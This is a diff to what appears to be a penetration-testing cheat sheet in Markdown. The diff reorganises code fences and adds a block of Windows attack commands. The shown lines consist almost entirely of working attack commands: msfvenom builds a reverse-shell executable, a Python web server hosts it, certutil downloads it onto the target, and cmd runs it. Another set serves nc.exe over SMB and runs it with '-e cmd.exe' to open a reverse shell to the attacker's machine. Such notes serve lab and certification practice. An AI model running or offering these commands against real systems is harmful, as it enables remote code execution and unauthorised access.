@@ -31,9 +31,9 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your kali IP> LPORT=<port you d
 python3 -m http.server 80
 && certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe
 && cmd /c C:\\Windows\\temp\\shell.exe
+````
 ## Buffer Overflow <img src="https://w7.pngwing.com/pngs/331/576/png-transparent-computer-icons-stack-overflow-encapsulated-postscript-stacking-angle-text-stack-thumbnail.png" width="40" height="40" />
 
-````
 ## MSFVENOM
 ### Windows 64 bit
 ````
@@ -61,6 +61,12 @@ locate nc.exe
 smbserver.py -smb2support Share .
 nc -nlvp 80
 cmd.exe /c //<your kali IP>/Share/nc.exe -e cmd.exe <your kali IP> 80
+````
+````
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=<your kali IP> LPORT=<port you designated> -f exe -o ~/shell.exe
+python3 -m http.server 80
+certutil -urlcache -split -f http://<your kali IP>/shell.exe C:\\Windows\temp\shell.exe
+cmd /c C:\\Windows\\temp\\shell.exe
 ````
 ## Port Forwarding/Tunneling <img src="https://cdn-icons-png.flaticon.com/512/3547/3547287.png" width="40" height="40" />
 ### Tools
